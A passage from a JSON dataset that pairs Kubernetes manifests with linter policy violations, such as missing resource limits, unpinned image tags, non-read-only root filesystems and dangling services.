    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "8871",
    "manifest_path": "data/manifests/the_stack_sample/sample_3347.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: steward-tenant-metrics\n  namespace: steward-system\n  labels:\n    app: steward-tenant-controller\nspec:\n  clusterIP: None\n  ports:\n  - name: http-metrics\n    port: 9090\n    protocol: TCP\n    targetPort: 9090\n  selector:\n    app: steward-tenant-controller\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:steward-tenant-controller])"
  },
  {
    "id": "8872",
    "manifest_path": "data/manifests/the_stack_sample/sample_3348.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: worker-app-pod\n  labels:\n    name: worker-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: worker-app\n    image: dockersamples/examplevotingapp_worker\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"worker-app\" is using an invalid container image, \"dockersamples/examplevotingapp_worker\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8873",
    "manifest_path": "data/manifests/the_stack_sample/sample_3348.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: worker-app-pod\n  labels:\n    name: worker-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: worker-app\n    image: dockersamples/examplevotingapp_worker\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"worker-app\" does not have a read-only root file system"
  },
  {
    "id": "8874",
    "manifest_path": "data/manifests/the_stack_sample/sample_3348.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: worker-app-pod\n  labels:\n    name: worker-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: worker-app\n    image: dockersamples/examplevotingapp_worker\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"worker-app\" is not set to runAsNonRoot"
  },
  {
    "id": "8875",
    "manifest_path": "data/manifests/the_stack_sample/sample_3348.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: worker-app-pod\n  labels:\n    name: worker-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: worker-app\n    image: dockersamples/examplevotingapp_worker\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"worker-app\" has cpu request 0"
  },
  {
    "id": "8876",
    "manifest_path": "data/manifests/the_stack_sample/sample_3348.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: worker-app-pod\n  labels:\n    name: worker-app-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: worker-app\n    image: dockersamples/examplevotingapp_worker\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"worker-app\" has memory limit 0"
  },
  {
    "id": "8877",
    "manifest_path": "data/manifests/the_stack_sample/sample_3349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: olegtrygub/myfrontend:v2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8878",
    "manifest_path": "data/manifests/the_stack_sample/sample_3349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: olegtrygub/myfrontend:v2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "8879",
    "manifest_path": "data/manifests/the_stack_sample/sample_3349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: olegtrygub/myfrontend:v2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "8880",
    "manifest_path": "data/manifests/the_stack_sample/sample_3349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: olegtrygub/myfrontend:v2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "8881",
    "manifest_path": "data/manifests/the_stack_sample/sample_3349.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: olegtrygub/myfrontend:v2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n        - name: ENV_PLATFORM\n          value: gcp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "8882",
    "manifest_path": "data/manifests/the_stack_sample/sample_3350.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: pod-example\nspec:\n  containers:\n  - name: web\n    image: nginx:1.7.9\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "8883",
    "manifest_path": "data/manifests/the_stack_sample/sample_3350.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: pod-example\nspec:\n  containers:\n  - name: web\n    image: nginx:1.7.9\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "8884",
    "manifest_path": "data/manifests/the_stack_sample/sample_3350.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: pod-example\nspec:\n  containers:\n  - name: web\n    image: nginx:1.7.9\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "8885",
    "manifest_path": "data/manifests/the_stack_sample/sample_3350.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: pod-example\nspec:\n  containers:\n  - name: web\n    image: nginx:1.7.9\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "8886",
    "manifest_path": "data/manifests/the_stack_sample/sample_3352.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: specs-v3-data-examples-v3bootstrap\n    fiaas/deployed_by: ''\n    fiaas/deployment_id: '1'\n    fiaas/version: 1.13.9-alpine\n  name: specs-v3-data-examples-v3bootstrap\n  namespace: kube-system\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: '80'\n  selector:\n    app: specs-v3-data-examples-v3bootstrap\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:specs-v3-data-examples-v3bootstrap])"
  },
  {
    "id": "8887",
    "manifest_path": "data/manifests/the_stack_sample/sample_3352.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: specs-v3-data-examples-v3bootstrap\n    fiaas/deployed_by: ''\n    fiaas/deployment_id: '1'\n    fiaas/version: 1.13.9-alpine\n  name: specs-v3-data-examples-v3bootstrap\n  namespace: kube-system\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: '80'\n  selector:\n    app: specs-v3-data-examples-v3bootstrap\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "invalid-target-ports",
    "violation_text": "port targetPort \"80\" in service \"specs-v3-data-examples-v3bootstrap\" must contain at least one letter (a-z)"
  },
  {
    "id": "8888",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app-hsmocsp\" is using an invalid container image, \"app-hsmocsp\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8889",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app-hsmocsp-pcscd\" is using an invalid container image, \"app-pki\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8890",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app-hsmocsp-pki\" is using an invalid container image, \"app-pki\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8891",
    "manifest_path": "data/manifests/the_stack_sample/sample_3357.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app-hsmocsp\n  namespace: default\n  labels:\n    app.kubernetes.io/name: app-hsmocsp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app-hsmocsp\n      app.kubernetes.io/name: app-hsmocsp\n  template:\n    metadata:\n      labels:\n        app: app-hsmocsp\n        app.kubernetes.io/name: app-hsmocsp\n      annotations: {}\n    spec:\n      affinity: {}\n      serviceAccountName: app-hsmocsp\n      securityContext:\n        fsGroup: 1000\n      volumes:\n      - name: app-hsmocsp-pcscd-volume\n        hostPath:\n          path: /var/run/pcscd/\n          type: ''\n      - name: app-hsmocsp-config\n        configMap:\n          name: app-hsmocsp-config\n      - name: app-hsmocsp-pki-config\n        configMap:\n          name: app-hsmocsp-pki-config\n      - name: app-hsmocsp-vault-config\n        configMap:\n          name: app-hsmocsp-vault-config\n      - name: app-hsmocsp-softhsm2-config\n        configMap:\n          name: app-hsmocsp-softhsm2-config\n      - name: app-hsmocsp-pki-volume\n        emptyDir: {}\n      - name: app-hsmocsp-softhsm2-token-volume\n        emptyDir: {}\n      containers:\n      - name: app-hsmocsp-pki\n        image: app-pki\n        args:\n        - init\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        env:\n        - name: OPENSSL_CA_DIR\n          value: /app/.config/pki\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        - name: HSM_SOPIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: sopin\n        - name: K8S_TOKEN_REVIEWER_JWT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: token\n        - name: K8S_CA_CRT\n          valueFrom:\n            secretKeyRef:\n              name: vault-auth-secret\n              key: ca.crt\n        volumeMounts:\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-pki-config\n          mountPath: /app/.config/pki/ca.conf\n          subPath: ca.conf\n        - mountPath: /app/.config/vault/vault-agent-config.hcl\n          name: app-hsmocsp-vault-config\n          subPath: vault-agent-config.hcl\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n      - name: app-hsmocsp\n        image: app-hsmocsp\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8080\n          name: http\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: http\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        startupProbe:\n          httpGet:\n            path: /healthz\n            port: http\n          failureThreshold: 2\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        args:\n        - -config\n        - /app/.config/hsmocsp/config.yaml\n        command:\n        - /app/app-hsmocsp\n        env:\n        - name: HSM_PIN\n          valueFrom:\n            secretKeyRef:\n              name: app-hsmocsp-secret\n              key: pin\n        volumeMounts:\n        - name: app-hsmocsp-config\n          mountPath: /app/.config/hsmocsp/config.yaml\n          subPath: config.yaml\n        - name: app-hsmocsp-pki-volume\n          mountPath: /app/.config/pki\n        - name: app-hsmocsp-softhsm2-token-volume\n          mountPath: /app/.config/softhsm2/tokens\n        - name: app-hsmocsp-softhsm2-config\n          mountPath: /app/.config/softhsm2/softhsm2.conf\n          subPath: softhsm2.conf\n        - name: app-hsmocsp-pcscd-volume\n          mountPath: /var/run/pcscd/\n      - name: app-hsmocsp-pcscd\n        image: app-pki\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 200m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        securityContext:\n          privileged: true\n          procMount: Default\n          runAsUser: 0\n        args:\n        - pcscd\n        command:\n        - /app/scripts/pki-entrypoint.sh\n        volumeMounts:\n        - name: app-hsmocsp-pcscd-volume\n          